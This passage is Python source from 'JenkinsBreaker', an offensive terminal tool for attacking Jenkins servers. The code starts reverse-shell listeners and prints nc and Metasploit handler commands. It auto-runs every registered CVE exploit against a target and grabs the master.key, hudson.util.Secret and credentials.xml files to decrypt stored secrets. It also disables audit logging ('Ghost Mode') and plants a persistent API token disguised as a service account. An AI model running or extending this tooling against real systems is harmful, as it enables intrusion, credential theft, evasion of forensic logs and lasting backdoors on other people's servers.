        handler_input = self.query_one("#handler-input", Input)

        lhost = lhost_input.value or "0.0.0.0"
        lport = int(lport_input.value) if lport_input.value else 4444
        handler = handler_input.value or "auto"

        # Check if user wants to use external handler (nc, msfconsole, etc.)
        if handler in ["nc", "netcat", "msfconsole", "msf"]:
            log.write("\n")
            log.log_header("External Handler Mode")
            log.log_info(f"Using external handler: {handler}")
            log.log_info("Run this manually in another terminal:")
            if handler in ["nc", "netcat"]:
                log.write(f"  [cyan]nc -lvnp {lport}[/cyan]\n")
            elif handler in ["msfconsole", "msf"]:
                log.write(f"  [cyan]msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'[/cyan]\n")

            status_bar = self.query_one(StatusBar)
            status_bar.listener_config = f"[yellow]External {handler.upper()}: {lport}[/yellow]"
            return

        log.write("\n")
        log.log_header("Starting Reverse Shell Listener")
        log.log_info(f"Listening on {lhost}:{lport}...")

        def connection_callback(conn, addr, session_id):
            """Called when shell connects"""
            log.log_success(f"\n[SHELL] Connection from {addr[0]}:{addr[1]}")
            log.log_success(f"[SHELL] Session ID: {session_id}")
            log.log_info("[SHELL] Session registered - Press 's' to view")
            self.query_one(SessionsPanel).refresh_sessions()

        try:
            self.active_listener = ReverseShellListener(lhost, lport, handler=handler)

            def listener_thread_func():
                self.active_listener.start(callback=connection_callback)

            self.listener_thread = threading.Thread(target=listener_thread_func, daemon=True)
            self.listener_thread.start()

            await asyncio.sleep(0.5)

            if self.listener_thread.is_alive():
                log.log_success(f"✓ Listener started on {lhost}:{lport}")
                log.log_info("Waiting for incoming shells...")

                status_bar = self.query_one(StatusBar)
                status_bar.listener_config = f"[green]Listening {lhost}:{lport}[/green]"
            else:
                log.log_error("Failed to start listener")

        except Exception as e:
            log.log_error(f"Listener error: {str(e)}")

    async def action_exploit(self) -> None:
        """Auto-exploit mode - test all vulnerabilities"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        lhost_input = self.query_one("#lhost-input", Input)
        lport_input = self.query_one("#lport-input", Input)
        handler_input = self.query_one("#handler-input", Input)

        lhost_bind = lhost_input.value or "0.0.0.0"
        lhost = self._get_payload_ip(lhost_bind)
        lport = int(lport_input.value) if lport_input.value else 4444
        handler = handler_input.value or "auto"

        if not self.active_listener or not self.listener_thread or not self.listener_thread.is_alive():
            log.log_warning("No listener running - starting automatically...")
            await self.action_start_listener()
            await asyncio.sleep(1)

        log.write("\n")
        log.log_header("Auto-Exploitation Mode")
        log.write(f"Payload: {lhost}:{lport} ({handler})\n\n")

        if self.verify_listener(lhost, lport):
            log.log_success(f"Listener verified on {lhost}:{lport}")
        else:
            log.log_warning(f"No listener detected on {lhost}:{lport}")
            log.log_info(f"Start listener: nc -lvnp {lport}")

        exploits = exploit_registry.list_all()
        tested = 0
        successful = 0
        
        from jenkins_breaker.post.session_manager import session_manager
        sessions_before = len(session_manager.list_active_sessions())

        for cve_id, metadata in sorted(exploits.items()):
            try:
                exploit_module = exploit_registry.get(cve_id)

                if metadata.requires_auth and not self.session.is_authenticated:
                    log.write(f"{cve_id}: Skipped (requires auth)\n")
                    continue

                # Run blocking operations in thread to keep UI responsive during auto-exploit
                is_vulnerable = await asyncio.to_thread(exploit_module.check_vulnerable, self.session)

                if is_vulnerable:
                    # Let exploit modules generate their own payloads
                    options = {
                        'lhost': lhost,
                        'lport': lport,
                        'handler': handler,
                        'target_os': self.payload_config['target_os'],
                        'encoding': self.payload_config['encoding']
                    }

                    result = await asyncio.to_thread(exploit_module.run, self.session, **options)
                    tested += 1

                    if result.status == "success":
                        log.log_success(f"{cve_id}: SUCCESS - {result.details}")
                        successful += 1

                        if result.data:
                            if 'credentials' in result.data:
                                log.log_success(f"  Captured {len(result.data['credentials'])} credentials")
                            if 'artifacts' in result.data:
                                log.log_success(f"  Captured {len(result.data['artifacts'])} artifacts")
                    else:
                        log.write(f"{cve_id}: Failed\n")
                else:
                    log.write(f"{cve_id}: Not vulnerable\n")

            except Exception as e:
                log.log_error(f"{cve_id}: Error - {str(e)}")

        log.write("\n")
        log.log_header(f"Results: {successful}/{tested} successful exploits")
        
        if successful > 0:
            log.write("\n")
            log.log_info("Waiting for shell connections (checking for 10 seconds)...")
            for i in range(20):
                await asyncio.sleep(0.5)
                sessions_after = len(session_manager.list_active_sessions())
                if sessions_after > sessions_before:
                    new_sessions = sessions_after - sessions_before
                    log.log_success(f"✓ {new_sessions} shell(s) connected!")
                    log.log_info("Press 's' to interact with sessions")
                    self.query_one(SessionsPanel).refresh_sessions()
                    break
            else:
                sessions_after = len(session_manager.list_active_sessions())
                if sessions_after == sessions_before:
                    log.log_warning(f"No new shells detected after 10 seconds (sessions: {sessions_before})")
                    log.log_info("Shells may connect later - check Sessions panel ('s')")
                else:
                    new_sessions = sessions_after - sessions_before
                    log.log_success(f"✓ {new_sessions} shell(s) connected!")
                    self.query_one(SessionsPanel).refresh_sessions()

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "connect-btn":
            asyncio.create_task(self.action_connect())
        elif event.button.id == "enumerate-btn":
            asyncio.create_task(self.action_enumerate())
        elif event.button.id == "exploit-btn":
            asyncio.create_task(self.action_exploit())
        elif event.button.id == "reset-btn":
            self.action_reset()

    def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        """Handle table row selection"""
        table = event.data_table
        row_key = event.row_key

        if table.id == "sessions-table" and row_key:
            session_id = str(row_key.value)
            self.interact_with_session(session_id)
        elif row_key:
            cve_id = str(row_key.value)
            asyncio.create_task(self.run_single_exploit(cve_id))

    def interact_with_session(self, session_id: str):
        """Interact with a specific session"""
        log = self.query_one(ExploitLog)
        session = session_manager.get_session(session_id)

        if not session:
            log.log_error(f"Session {session_id} not found")
            return

        if not session.connection:
            log.log_error(f"Session {session_id} has no active connection")
            return

        if session.status == SessionStatus.DEAD:
            log.log_error(f"Session {session_id} is dead - cannot interact")
            return

        log.log_info(f"Interacting with session {session_id}...")
        self.push_screen(ShellInteraction(session_id))

    def on_input_changed(self, event: Input.Changed) -> None:
        """Update listener status when inputs change"""
        if event.input.id in ["lhost-input", "lport-input"]:
            self.update_listener_status()

    def auto_refresh_panels(self):
        """Auto-refresh sessions and loot panels"""
        try:
            sessions_panel = self.query_one(SessionsPanel)
            sessions_panel.refresh_sessions()

            loot_panel = self.query_one(LootPanel)
            loot_panel.refresh_loot()
        except:
            pass

    def action_refresh_sessions(self):
        """Manually refresh sessions panel"""
        try:
            sessions_panel = self.query_one(SessionsPanel)
            sessions_panel.refresh_sessions()
            log = self.query_one(ExploitLog)
            log.log_info("Sessions refreshed")
        except Exception:
            pass

    async def action_interact_session(self):
        """Interact with selected session from SessionsPanel"""
        log = self.query_one(ExploitLog)

        try:
            sessions_panel = self.query_one(SessionsPanel)

            if sessions_panel.cursor_row < 0:
                log.log_warning("No session selected - Use arrow keys or j/k to select")
                return

            row_key = sessions_panel.get_row_at(sessions_panel.cursor_row)
            if not row_key:
                log.log_warning("No session selected")
                return

            session_id = str(row_key[0])

            session_meta = session_manager.get_session(session_id)
            if not session_meta:
                log.log_error(f"Session {session_id} not found")
                return

            if session_meta.status == SessionStatus.DEAD:
                log.log_error(f"Session {session_id} is dead - cannot interact")
                return

            log.log_info(f"Interacting with session {session_id}...")
            self.push_screen(ShellInteraction(session_id))

        except Exception as e:
            log.log_error(f"Failed to interact with session: {str(e)}")

    def action_refresh_loot(self):
        """Manually refresh loot panel"""
        try:
            loot_panel = self.query_one(LootPanel)
            loot_panel.refresh_loot()
            log = self.query_one(ExploitLog)
            log.log_info("Loot refreshed")
        except Exception:
            pass

    async def action_grab_decrypt_files(self):
        """Grab files needed for offline credential decryption (auto-runs during enumeration)"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Manual Credential File Grab")
        log.log_info("Note: Enumeration ('e') automatically grabs these files")

        files_to_grab = {
            'master.key': '/secrets/master.key',
            'hudson.util.Secret': '/secrets/hudson.util.Secret',
            'credentials.xml': '/credentials.xml'
        }

        grabbed_count = 0

        for filename, path in files_to_grab.items():
            try:
                log.log_info(f"Attempting to grab {filename}...")

                response = self.session.get(path, allow_redirects=False)

                if response.status_code == 200 and response.content:
                    from datetime import datetime

                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    local_filename = f"{filename}_{timestamp}"

                    loot_manager.add_loot(
                        loot_type="credential_file",
                        content=response.content,
                        source=self.session.base_url,
                        metadata={
                            "filename": local_filename,
                            "original_path": path,
                            "size": len(response.content),
                            "purpose": "offline_credential_decryption"
                        }
                    )

                    grabbed_count += 1
                    log.log_success(f"Grabbed {filename} ({len(response.content)} bytes)")

                else:
                    log.log_warning(f"Could not access {filename} (HTTP {response.status_code})")

            except Exception as e:
                log.log_error(f"Failed to grab {filename}: {str(e)}")

        if grabbed_count > 0:
            log.log_success(f"\nSuccessfully grabbed {grabbed_count}/3 decryption files")
            log.log_info("\nDecryption options:")
            log.log_info("  1. Built-in: from jenkins_breaker.postex.jenkins_decrypt import JenkinsDecryptor")
            log.log_info("  2. Standalone: python offsec-jenkins/decrypt.py --key master.key --secret hudson.util.Secret --xml credentials.xml")
            log.log_info("\nFiles saved to loot manager - use 'l' to view and export")

            if workspace_manager.current_workspace:
                workspace_manager.add_timeline_event(
                    action="grab_decrypt_files",
                    target=self.session.base_url,
                    details=f"Grabbed {grabbed_count} credential files"
                )
        else:
            log.log_error("Failed to grab any decryption files - might need script console access")
            log.log_info("Alternative: Try using script console to read file contents")

    async def action_grab_credentials(self):
        """Manually grab Jenkins credential files"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Credential File Grabber")
        log.log_info("Attempting to grab master.key, hudson.util.Secret, and credentials.xml...")

        try:
            from jenkins_breaker.postex.auto_loot import auto_grab_jenkins_credentials

            cred_result = auto_grab_jenkins_credentials(self.session, loot_manager)

            files = cred_result.get('files', {})

            if cred_result.get('files_grabbed', 0) > 0:
                log.log_success(f"\n✓ Successfully grabbed {cred_result['files_grabbed']}/3 files:")
                for filename, content in files.items():
                    size = len(content) if content else 0
                    log.log_success(f"  • {filename} ({size} bytes)")

                if cred_result.get('can_decrypt'):
                    log.log_success("\n✓ Decryption keys available!")
                    secrets_found = cred_result.get('secrets_found', 0)
                    if secrets_found > 0:
                        log.log_success(f"✓ Decrypted {secrets_found} secrets from credentials.xml")
                    else:
                        log.log_info("  credentials.xml exists but contains no encrypted secrets")
                        log.log_info("  (Target may have no configured credentials or uses external credential store)")
                else:
                    log.log_warning("\n! Partial grab - need master.key + hudson.util.Secret for decryption")

                log.log_info("\nFiles saved to loot manager - press 'l' to view and export")

                self.query_one(LootPanel).refresh_loot()

                if workspace_manager.current_workspace:
                    workspace_manager.add_timeline_event(
                        action="manual_credential_grab",
                        target=self.session.base_url,
                        details=f"Grabbed {cred_result['files_grabbed']} files, {cred_result.get('secrets_found', 0)} secrets"
                    )
            else:
                log.log_error("Failed to grab any credential files")
                log.log_info("\nPossible reasons:")
                log.log_info("  • No file-read vulnerability available")
                log.log_info("  • Script console disabled")
                log.log_info("  • Non-standard Jenkins installation path")
                log.log_info("\nTry:")
                log.log_info("  1. Run enumeration (press 'e') to find file-read vulns")
                log.log_info("  2. Exploit CVE-2024-23897, CVE-2021-21602, or similar")
                log.log_info("  3. Use script console if available")

        except Exception as e:
            log.log_error(f"Credential grab failed: {str(e)}")
            import traceback
            log.write(f"\n[dim]{traceback.format_exc()}[/dim]\n")

    async def action_open_crumb_vault(self):
        """Open Crumb Vault modal for manual session injection"""
        async def check_vault_result(result):
            if result and result.get('action') == 'save':
                jsessionid = result.get('jsessionid', '').strip()
                crumb = result.get('crumb', '').strip()

                log = self.query_one(ExploitLog)
                log.write("\n")
                log.log_header("Crumb Vault - Session Injection")

                if jsessionid and self.session:
                    self.session.session.cookies.set('JSESSIONID', jsessionid)
                    log.log_success(f"✓ Injected JSESSIONID: {jsessionid[:20]}...")

                if crumb and self.session and self.session.crumb_manager:
                    from jenkins_breaker.core.authentication import Crumb
                    self.session.crumb_manager._crumb = Crumb(value=crumb, field='.crumb')
                    log.log_success(f"✓ Injected Jenkins-Crumb: {crumb[:20]}...")

                    crumb_status = self.query_one(CrumbStatus)
                    crumb_status.set_crumb_data(
                        crumb_value=crumb,
                        status="Injected",
                        vulnerabilities={}
                    )

                if not jsessionid and not crumb:
                    log.log_info("No credentials provided - session unchanged")

        self.push_screen(CrumbVault(), check_vault_result)

    async def action_toggle_ghost_mode(self):
        """Toggle Ghost Mode (log suppression)"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Ghost Mode - Anti-Forensics")

        try:
            from jenkins_breaker.postex.persistence import JenkinsPersistence

            persistence = JenkinsPersistence(self.session)
            result = persistence.enable_ghost_mode()

            if result.success:
                log.log_success("✓ Ghost Mode enabled - Jenkins logging suppressed")
                log.log_info("  All security audit logs disabled")
                log.log_info("  Safe to run noisy exploits")
                log.log_info("\nTo disable: Run disable_ghost_mode() or restart Jenkins")

                status_bar = self.query_one(StatusBar)
                status_bar.listener_config = status_bar.listener_config + " [red][GHOST][/red]"

                if workspace_manager.current_workspace:
                    workspace_manager.add_timeline_event(
                        action="ghost_mode_enabled",
                        target=self.session.base_url,
                        details="Suppressed all Jenkins logging for OPSEC"
                    )
            else:
                log.log_error(f"Failed to enable Ghost Mode: {result.details}")
                log.log_info("Requires RCE access (script console or groovy sandbox)")

        except Exception as e:
            log.log_error(f"Ghost Mode failed: {str(e)}")

    async def action_create_backdoor(self):
        """Generate Golden Ticket persistent API token"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Golden Ticket - Persistent API Token")
        log.log_info("Generating API token that survives password resets...")

        try:
            from jenkins_breaker.postex.persistence import JenkinsPersistence

            persistence = JenkinsPersistence(self.session)
            result = persistence.generate_api_token(token_name="system-integration-service")

            if result.success:
                log.log_success("✓ Golden Ticket generated!")
                log.log_info(f"\n{result.details}\n")
                log.log_info("Persistence features:")
                log.log_info("  • Survives password resets")
                log.log_info("  • Stored in Jenkins database")
                log.log_info("  • Looks like legitimate service account")
                log.log_info("\nUsage:")
                log.log_info("  curl -u <username>:<token> http://target:8080/api/json")
                log.log_info(f"\nCleanup: {result.cleanup_command}")

                import re
                token_match = re.search(r'([a-f0-9]{32,})', result.details)
                if token_match:
                    token = token_match.group(1)
                    username_match = re.search(r"user '([^']+)'", result.details)
                    username = username_match.group(1) if username_match else "admin"

                    loot_manager.add_credential(
                        cred_type="jenkins_api_token",
                        username=username,
                        token=token,
                        source="golden_ticket",
                        metadata={
                            "token_name": "system-integration-service",
                            "persistence": "survives_password_reset",
                            "created_via": "CVE_or_script_console"
                        }
                    )
                    log.log_success("\n✓ Token saved to loot manager - press 'l' to view")
                    self.query_one(LootPanel).refresh_loot()

                if workspace_manager.current_workspace:
                    workspace_manager.add_timeline_event(
                        action="golden_ticket_created",
                        target=self.session.base_url,
                        details="Generated persistent API token"
                    )
            else:
                log.log_error(f"Failed to generate Golden Ticket: {result.details}")
                log.log_info("Requires RCE access (script console or groovy sandbox)")

        except Exception as e:
            log.log_error(f"Golden Ticket generation failed: {str(e)}")

    async def action_test_crumb(self):
        """Test CSRF crumb for security vulnerabilities"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        if not self.session.crumb_manager:
            log.log_error("No crumb manager available")
            return

        log.write("\n")
        log.log_header("CSRF Crumb Security Testing")

        try:
            crumb_status = self.query_one(CrumbStatus)
            vulnerabilities = {}

            log.log_info("Fetching CSRF crumb...")
            if self.session.crumb_manager.fetch():
                crumb_value = self.session.crumb_manager.crumb.value
                log.log_success(f"Crumb: {crumb_value[:24]}...")

                log.log_info("Validating crumb with test POST request...")
                if self.session.crumb_manager.validate_crumb():
                    log.log_success("Crumb validation: PASSED")
                    status = "Verified"
                else:
                    log.log_warning("Crumb validation: FAILED")
                    status = "Invalid"

                log.log_info("\nTesting for session binding vulnerabilities...")
                binding_results = self.session.crumb_manager.check_crumb_binding()

                if binding_results.get('tested'):
                    if binding_results.get('replay_vulnerable'):
                        log.log_warning("[!] VULNERABLE: Crumb works without session cookie (replay attacks possible)")
                        vulnerabilities['replay_vulnerable'] = True
                    else:
                        log.log_success("✓ Session binding enforced")

                    if binding_results.get('no_session_binding'):
                        log.log_warning("[!] No session binding - crumb can be reused across sessions")
                        vulnerabilities['no_ip_binding'] = True
                    else:
                        log.log_success("✓ Crumb properly bound to session")

                log.log_info("\nTesting crumb rotation...")
                rotation_results = self.session.crumb_manager.test_rotation(num_requests=5)

                if rotation_results.get('tested'):
                    if rotation_results.get('rotates'):
                        log.log_success(f"✓ Crumb rotates ({rotation_results['unique_crumbs']} unique values in {rotation_results['total_requests']} requests)")
                    else:
                        log.log_warning(f"[!] Crumb does NOT rotate (same value across {rotation_results['total_requests']} requests)")

                crumb_status.set_crumb_data(
                    crumb_value=crumb_value,
                    status=status,
                    vulnerabilities=vulnerabilities
                )

                log.log_info("\n[bold cyan]Crumb status updated in display panel[/bold cyan]")

            else:
                log.log_warning("No CSRF protection enabled (crumb issuer returned 404)")
                crumb_status.set_crumb_data(status="Missing")

        except Exception as e:
            log.log_error(f"Crumb testing failed: {str(e)}")

    async def action_start_fuzzer(self):
        """Start fuzzer against current target"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Starting Fuzzer")
        log.log_info(f"Target: {self.session.base_url}")

        try:
            self.fuzzer = JenkinsFuzzer(
                base_url=self.session.base_url,
                username=self.session.config.username,
                password=self.session.config.password,
                session=self.session.session
            )

            log.log_info("Running fuzzing modules...")
            results = self.fuzzer.fuzz_all()

            total_findings = sum(len(f) for f in results.values())

            if total_findings == 0:
                log.log_success("No vulnerabilities found")
            else:
                log.log_warning(f"Found {total_findings} potential issues:")

                for category, findings in results.items():
                    if findings:
                        log.write(f"\n[bold cyan]{category.replace('_', ' ').title()}:[/bold cyan]\n")
                        for finding in findings[:5]:
                            severity = finding.get('severity', 'info')
                            severity_color = {
                                'critical': 'red',
                                'high': 'orange1',
                                'medium': 'yellow',
                                'low': 'blue'
                            }.get(severity, 'white')
                            log.write(f"  [{severity_color}][{severity.upper()}][/{severity_color}] {finding.get('description', 'No description')}\n")

                if workspace_manager.current_workspace:
                    workspace_manager.add_timeline_event(
                        action="fuzzer_scan",
                        target=self.session.base_url,
                        details=f"Found {total_findings} issues"
                    )

        except Exception as e:
            log.log_error(f"Fuzzer error: {str(e)}")

    def action_show_cve_info(self):
        """Show detailed CVE info for selected exploit"""
        try:
            cve_table = self.query_one(CVETable)
            if cve_table.cursor_row is not None:
                row_key = cve_table.get_row_at(cve_table.cursor_row)
                if row_key:
                    log = self.query_one(ExploitLog)
                    log.write("\n")

                    cve_id = str(row_key[0])
                    metadata = exploit_registry.list_all().get(cve_id)

                    if metadata:
                        log.log_header(f"CVE Info: {cve_id}")
                        log.write(f"[cyan]Name:[/cyan] {metadata.name}\n")
                        log.write(f"[cyan]Severity:[/cyan] {metadata.severity.upper()}\n")
                        log.write(f"[cyan]Auth Required:[/cyan] {'Yes' if metadata.requires_auth else 'No'}\n")
                        log.write(f"[cyan]Description:[/cyan] {metadata.description or 'N/A'}\n")
        except Exception:
            pass

    def action_toggle_verbose(self):
        """Toggle verbose mode"""
        self.verbose_mode = not self.verbose_mode
        log = self.query_one(ExploitLog)
        mode = "ON" if self.verbose_mode else "OFF"
        log.log_info(f"Verbose mode: {mode}")

    def action_cursor_down(self):
        """Move cursor down in CVE table (vim j)"""
        try:
            cve_table = self.query_one(CVETable)
            if cve_table.cursor_row is not None:
                cve_table.cursor_row = min(cve_table.cursor_row + 1, cve_table.row_count - 1)
        except Exception:
            pass

    def action_cursor_up(self):
        """Move cursor up in CVE table (vim k)"""
        try:
            cve_table = self.query_one(CVETable)
            if cve_table.cursor_row is not None:
                cve_table.cursor_row = max(cve_table.cursor_row - 1, 0)
        except Exception:
            pass

    def action_search_filter(self):
        """Open search/filter dialog"""
        log = self.query_one(ExploitLog)
        log.write("\n")
        log.log_header("CVE Filtering")
        log.write("[yellow]Quick Filters:[/yellow]\n")
        log.write("  [cyan]critical[/cyan] - Show only critical severity CVEs\n")
        log.write("  [cyan]high[/cyan] - Show only high severity CVEs\n")
        log.write("  [cyan]medium[/cyan] - Show only medium severity CVEs\n")
        log.write("  [cyan]low[/cyan] - Show only low severity CVEs\n")
        log.write("  [cyan]noauth[/cyan] - Show CVEs that don't require authentication\n")
        log.write("  [cyan]auth[/cyan] - Show CVEs that require authentication\n")
        log.write("  [cyan]clear[/cyan] - Clear all filters\n\n")
        log.write("[dim]Or type any text to search CVE ID/name[/dim]\n")

        try:
            cve_table = self.query_one(CVETable)

            if self.cve_filter.lower() == "critical":
                cve_table.set_filter(severity="critical")
                log.log_success("Showing critical CVEs only")
            elif self.cve_filter.lower() == "high":
                cve_table.set_filter(severity="high")
                log.log_success("Showing high severity CVEs only")
            elif self.cve_filter.lower() == "medium":
                cve_table.set_filter(severity="medium")
                log.log_success("Showing medium severity CVEs only")
            elif self.cve_filter.lower() == "low":
                cve_table.set_filter(severity="low")
                log.log_success("Showing low severity CVEs only")
            elif self.cve_filter.lower() == "noauth":
                cve_table.set_filter(auth=False)
                log.log_success("Showing CVEs without authentication")
            elif self.cve_filter.lower() == "auth":
                cve_table.set_filter(auth=True)
                log.log_success("Showing CVEs requiring authentication")
            elif self.cve_filter.lower() == "clear":
                cve_table.clear_filters()
                log.log_success("Filters cleared")
            else:
                log.log_info("Use Ctrl+P to see filter commands")
        except Exception as e:
            log.log_error(f"Filter error: {str(e)}")

    def action_command_palette(self):
        """Show command palette"""
        log = self.query_one(ExploitLog)
        log.write("\n")
        log.log_header("Command Palette - All Available Commands")
        log.write("[bold]Exploitation:[/bold]\n")
        log.write("  [cyan]c[/cyan] - Connect to target\n")
        log.write("  [cyan]e[/cyan] - Enumerate target\n")
        log.write("  [cyan]x[/cyan] - Auto-exploit all CVEs\n")
        log.write("  [cyan]f[/cyan] - Start fuzzer\n")
        log.write("  [cyan]h[/cyan] - Execute exploit chain\n\n")
        log.write("[bold]Customization:[/bold]\n")
        log.write("  [cyan]p[/cyan] - Customize payload (OS, encoding, obfuscation)\n")
        log.write("  [cyan]o[/cyan] - Toggle OPSEC features\n")
        log.write("  [cyan]i[/cyan] - Show CVE info\n")
        log.write("  [cyan]/[/cyan] - Filter CVEs by severity/name\n\n")
        log.write("[bold]Session Management:[/bold]\n")
        log.write("  [cyan]s[/cyan] - Refresh sessions panel\n")
        log.write("  [cyan]l[/cyan] - Refresh loot panel\n")
        log.write("  [cyan]t[/cyan] - Show operation timeline\n")
        log.write("  [cyan]w[/cyan] - Save workspace\n\n")
        log.write("[bold]Reporting:[/bold]\n")
        log.write("  [cyan]g[/cyan] - Generate report (Markdown)\n\n")
        log.write("[bold]Other:[/bold]\n")
        log.write("  [cyan]v[/cyan] - Toggle verbose mode\n")
        log.write("  [cyan]j/k[/cyan] - Navigate CVE table (vim-style)\n")
        log.write("  [cyan]ctrl+p[/cyan] - This palette\n")
        log.write("  [cyan]r[/cyan] - Reset session\n")
        log.write("  [cyan]q[/cyan] - Quit\n")

    def action_show_timeline(self):
        """Show operation timeline"""
        log = self.query_one(ExploitLog)
        log.write("\n")
        log.log_header("Operation Timeline")

        if workspace_manager.current_workspace:
            timeline = workspace_manager.get_timeline(limit=20)
            if timeline:
                for event in timeline:
                    timestamp = event['timestamp'][:19]
                    action = event['action']
                    target = event['target']
                    details = event['details']
                    log.write(f"[dim]{timestamp}[/dim] [cyan]{action}[/cyan] {target} - {details}\n")
            else:
                log.log_info("No timeline events")
        else:
            log.log_warning("No workspace loaded - timeline not available")
            log.log_info("Create workspace: workspace_manager.create_workspace('my_op')")

    def action_save_workspace(self):
        """Save current state to workspace"""
        log = self.query_one(ExploitLog)

        if not workspace_manager.current_workspace:
            workspace_name = f"op_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            if workspace_manager.create_workspace(workspace_name, "Auto-created workspace"):
                workspace_manager.load_workspace(workspace_name)
                log.log_success(f"Created workspace: {workspace_name}")
            else:
                log.log_error("Failed to create workspace")
                return

        workspace_manager.save_session_state(session_manager)
        workspace_manager.save_loot_state(loot_manager)

        if self.session:
            workspace_manager.add_target(
                url=self.session.base_url,
                version=self.session.version or "Unknown"
            )

        log.log_success(f"Workspace saved: {workspace_manager.current_workspace}")

        session_count = session_manager.get_session_count()
        loot_stats = loot_manager.get_statistics()
        log.log_info(f"  Sessions: {session_count['total']}")
        log.log_info(f"  Credentials: {loot_stats['total_credentials']}")
        log.log_info(f"  Artifacts: {loot_stats['total_artifacts']}")

    def action_customize_payload(self):
        """Open interactive payload configuration modal"""
        def handle_config_update(new_config):
            if new_config:
                self.payload_config = new_config

                # Update the display widget
                customizer = self.query_one(PayloadCustomizer)
                customizer.set_config(
                    target_os=new_config['target_os'],
                    encoding=new_config['encoding'],
                    obfuscation=new_config['obfuscation']
                )

                # Log the change
                log = self.query_one(ExploitLog)
                log.write("\n")
                log.log_header("Payload Configuration Updated")
                log.log_success(f"Target OS: {new_config['target_os']}")
                log.log_success(f"Encoding: {new_config['encoding']}")
                log.log_success(f"Obfuscation: {new_config['obfuscation']}")

        self.push_screen(PayloadConfigModal(self.payload_config), handle_config_update)

    def action_toggle_opsec(self):
        """Toggle OPSEC features"""
        self.opsec_enabled = not self.opsec_enabled

        log = self.query_one(ExploitLog)
        log.write("\n")
        log.log_header("OPSEC Configuration")

        status = "ENABLED" if self.opsec_enabled else "DISABLED"
        log.write(f"OPSEC Mode: [{'green' if self.opsec_enabled else 'red'}]{status}[/]\n\n")

        if self.opsec_enabled:
            log.write("[green]✓[/green] Jitter timing: ACTIVE\n")
            log.write("[green]✓[/green] Payload polymorphism: ACTIVE\n")
            log.write(f"[green]✓[/green] Payload obfuscation: {self.payload_config['obfuscation']}\n")
            log.write("[green]✓[/green] HTTP User-Agent randomization: ACTIVE\n")
        else:
            log.write("[red]✗[/red] OPSEC features disabled - payloads sent as-is\n")

        log.write("\n[dim]Toggle with 'o' key | Configure with 'p' key[/dim]\n")

    def action_execute_chain(self):
        """Execute selected exploit chain"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Available Exploit Chains")
        log.write("[yellow]Available chains:[/yellow]\n")
        log.write("  1. [cyan]Initial Access Chain[/cyan] (3 steps)\n")
        log.write("     → File read → Creds → Reverse shell\n\n")
        log.write("  2. [cyan]Full Compromise Chain[/cyan] (8 steps)\n")
        log.write("     → RCE → Recon → Persistence → Lateral movement\n\n")
        log.write("[yellow]To execute:[/yellow]\n")
        log.write("  Modify code to select chain, or press 'h' again to run Initial Access chain\n\n")

        lhost_input = self.query_one("#lhost-input", Input)
        lport_input = self.query_one("#lport-input", Input)
        lhost = lhost_input.value or "127.0.0.1"
        lport = int(lport_input.value) if lport_input.value else 4444

        try:
            log.log_info("Executing Initial Access Chain...")
            chain_steps = initial_access_chain(lhost, lport)

            self.chain_engine = ChainEngine(self.session)
            result = self.chain_engine.execute_chain(chain_steps)

            if result.success:
                log.log_success(f"Chain completed: {result.steps_executed} steps executed")
            else:
                log.log_error(f"Chain failed: {result.steps_failed} steps failed")

            for step_result in result.step_results:
                status_color = "green" if step_result['status'] == 'success' else "red"
                log.write(f"  [{status_color}]{step_result['name']}[/{status_color}]: {step_result.get('result', 'N/A')}\n")

            if workspace_manager.current_workspace:
                workspace_manager.add_timeline_event(
                    action="exploit_chain",
                    target=self.session.base_url,
                    details=f"Initial Access: {result.steps_executed} steps"
                )
        except Exception as e:
            log.log_error(f"Chain execution error: {str(e)}")

    def action_generate_report(self):
        """Generate comprehensive operation report"""
        log = self.query_one(ExploitLog)
        log.write("\n")
        log.log_header("Report Generation")

        if not workspace_manager.current_workspace:
            log.log_warning("No workspace loaded - create one first")
            return

        try:
            from pathlib import Path

            report_dir = Path.home() / ".jenkins_breaker" / "reports"
            report_dir.mkdir(parents=True, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = report_dir / f"report_{workspace_manager.current_workspace}_{timestamp}.md"

            sessions = workspace_manager.get_all_sessions()
            loot = workspace_manager.get_all_loot()
            timeline = workspace_manager.get_timeline(limit=100)

            with open(report_file, 'w') as f:
                f.write("# JenkinsBreaker Operation Report\n\n")
                f.write(f"**Workspace:** {workspace_manager.current_workspace}\n")
                f.write(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                f.write("## Executive Summary\n\n")
                f.write(f"- **Sessions Captured:** {len(sessions)}\n")
                f.write(f"- **Credentials Harvested:** {len([l for l in loot if l['type'] == 'credential'])}\n")
                f.write(f"- **Artifacts Collected:** {len([l for l in loot if l['type'] == 'artifact'])}\n\n")

                f.write("## Sessions\n\n")
                for session in sessions:
                    f.write(f"### Session {session['session_id']}\n")
                    f.write(f"- **Host:** {session['remote_host']}:{session['remote_port']}\n")
                    f.write(f"- **User:** {session.get('username', 'unknown')}\n")
                    f.write(f"- **Shell:** {session.get('shell_type', 'unknown')}\n")
                    f.write(f"- **Status:** {session.get('status', 'unknown')}\n\n")

                f.write("## Credentials\n\n")
                for item in loot:
                    if item['type'] == 'credential':
